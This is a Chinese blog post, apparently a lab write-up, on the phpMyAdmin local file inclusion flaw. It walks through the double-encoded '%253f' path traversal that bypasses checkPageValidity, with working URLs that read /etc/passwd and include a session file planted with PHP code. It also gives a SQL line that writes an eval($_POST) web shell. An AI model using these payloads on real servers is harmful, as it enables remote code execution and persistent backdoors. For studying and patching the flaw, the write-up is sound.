<!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="author" content="John Doe"><link rel="alternative" href="/atom.xml" title="昵称不可为空" type="application/atom+xml"><link rel="icon" href="/favicon.png"><title>phpadmin文件包含漏洞 - 昵称不可为空</title><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css"><!--[if lt IE 9]><script>(function(a,b){a="abbr article aside audio bdi canvas data datalist details dialog figcaption figure footer header hgroup main mark meter nav output progress section summary template time video".split(" ");for(b=a.length-1;b>=0;b--)document.createElement(a[b])})()</script><![endif]--><script src="/js/jquery-3.1.1.min.js"></script><script src="/js/fancybox/jquery.fancybox.min.js"></script></head><body style="opacity:0"><header class="head"><h1 class="head-title u-fl"><a href="/">昵称不可为空</a></h1><nav class="head-nav u-fr"><ul class="head-nav__list"><li class="head-nav__item"><a class="head-nav__link" href="/tags">标签</a></li><li class="head-nav__item"><a class="head-nav__link" href="/archives">目录</a></li></ul></nav></header><main class="main"><article class="post"><header class="post__head"><time class="post__time" datetime="2019-07-28T13:18:45.363Z">2019 - 07 - 28 21:18:45</time><h1 class="post__title"><a href="/2019/07/28/phpadmin文件包含漏洞/">phpadmin文件包含漏洞</a></h1><div class="post__main echo"><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><p>登陆进入phpMyadmin<br>点击SQL执行  select ‘<?php phpinfo();exit;?>‘<br>在网页上打开开发者工具在Elements所属行点击Application,在左侧列中找到Session Storage 中的Cookies,找到phpMyadmin的网址，这样session id就为Value值。<br>在本机浏览器打开  虚拟机ip/phpMyAdmin(/var/www/html下你的phpMyadmin名字)/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_你的Value值。就可以成功利用该漏洞。</p>
<p>以下也可以成功执行<br>虚拟机ip/phpMyAdmin(/var/www/html下你的phpMyadmin名字)/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</p>
<h3 id="sessionID文件常见路径"><a href="#sessionID文件常见路径" class="headerlink" title="sessionID文件常见路径"></a>sessionID文件常见路径</h3><p>在Linux下，常见的文件路径为： /var/lib/php/session/<br>在Windows下：<br>phpstudy集成软件环境下，文件路径为：<br>/phpstudy/PHPTutorial/tmp/tmp<br>Wamp集成软件环境下，文件路径为：<br>/wamp64/tmp</p>
<p>url <a href="http://www.baidu.com/index.php?target=anacoda-ks.cfg" target="_blank" rel="noopener">www.baidu.com/index.php?target=anacoda-ks.cfg</a><br>?分割后取最后部分 anaconda-ks.cfg<br>cat ../../../../../../../../etc/passwd<br>直接加？会被检测到<br>%253f<br>%–&gt;%25<br>?–&gt;%3f<br>cat /var/lib/php/session/sess_</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="string">"&lt;?php file_put_contents('./404.php','&lt;？php eval(<span class="variable">$_POST</span>[1])?&gt;');？&gt;"</span></span><br></pre></td></tr></table></figure>

<h2 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h2><p>/var/www/html/phpmyadmin<br>vim index.php</p>
<p>50 $target_blacklist = array (<br>51 ‘import.php’, ‘export.php’<br>52 );<br>不能在$target_blacklist数组内。</p>
<p>55 if (! empty($_REQUEST[‘target’])<br>56     &amp;&amp; is_string($_REQUEST[‘target’])<br>57     &amp;&amp; ! preg_match(‘/^index/‘, $_REQUEST[‘target’])<br>58     &amp;&amp; ! in_array($_REQUEST[‘target’], $target_blacklist)<br>59     &amp;&amp; Core::checkPageValidity($_REQUEST[‘target’])<br>60 ) {<br>61     include $_REQUEST[‘target’];<br>62     exit;<br>63 }<br>这里的target 可以直接传值输入。我们可以传入一个本地文件路径去让其包含，就会造成LFI漏洞。<br>首先，我们满足4个条件：<br>1．传入的target 需要是一个字符串。<br>2．不能以/index/ 开头。</p>
<p>需要满足checkPageValidity函数要求。<br>cd /var/www/html/phpmyadmin/libraries/classes/Core.php</p>
<p>443     public static function checkPageValidity(&amp;$page, array $whitelist = [])<br>444     {<br>445         if (empty($whitelist)) {<br>446             $whitelist = self::$goto_whitelist;<br>447         }<br>448         if (! isset($page) || !is_string($page)) {<br>449             return false;<br>450         }<br>451<br>452         if (in_array($page, $whitelist)) {<br>453             return true;<br>// 这里的$page在in_array之前没有经过任何的修饰，直接就与$whitelist作比较。没有办法绕过，传入的target值只能为白名单里的文件名才行。很明显，第一个并不能利用。<br>454         }<br>455<br>456         $_page = mb_substr(<br>457             $page,<br>458             0,<br>459             mb_strpos($page . ‘?’, ‘?’)<br>460         );<br>461         if (in_array($_page, $whitelist)) {<br>462             return true;<br>// mb_strpos()函数的意思是查找字符串在另一个字符串中首次出现的位置。<br>mb_substr()函数的意思是：从$str字符串中，提取从$start位置开始，长度为$length的字符串。可以看出，第二个可以返回ture，我们利用db_sql.php?/../../格式就可以达到目的，绕过白名单限制。但是include ‘db_sql.php?/../../../aaa.txt’不能跨路径包含。</p>
<p>463         }<br>464<br>465         $_page = urldecode($page);<br>466         $_page = mb_substr(<br>467             $_page,<br>468             0,<br>469             mb_strpos($_page . ‘?’, ‘?’)<br>470         );<br>471         if (in_array($_page, $whitelist)) {<br>472             return true;<br>//第三个和第二个对比多出了个urldecode()函数。<br>我们可以利用双重编码绕过，将?经过两次编码%253f就可以绕过白名单验证。<br>%253f 传入时，首先会被自动解码一次，变成%3f。然后urldecode()再解码一次，就变成了 ?。 成功绕过了白名单限制。<br>这种情况下include的包含情况就是这样的，也就可以任意包含本地文件了。<br>include  db_sql.php%3f/../../../aaa.txt<br>473         }<br>474<br>475         return false;<br>476     }<br>函数有三处返回ture的地方，只要有任意一处返回ture就可以。这三处，有一个共同点，都是需要$page在$whitelist数组中内才会返回true。</p>
</div></header></article><section class="reward"><a class="btn-reward" href="#">打赏</a><div class="reward-wrapper clearfix"><img src="/img/wechat.png" title="微信"></div></section></main><footer class="foot"><div class="foot-copy">&copy; 2016 - 2019 John Doe</div></footer><script src="/js/scroller.js"></script><script src="/js/main.js"></script></body></html>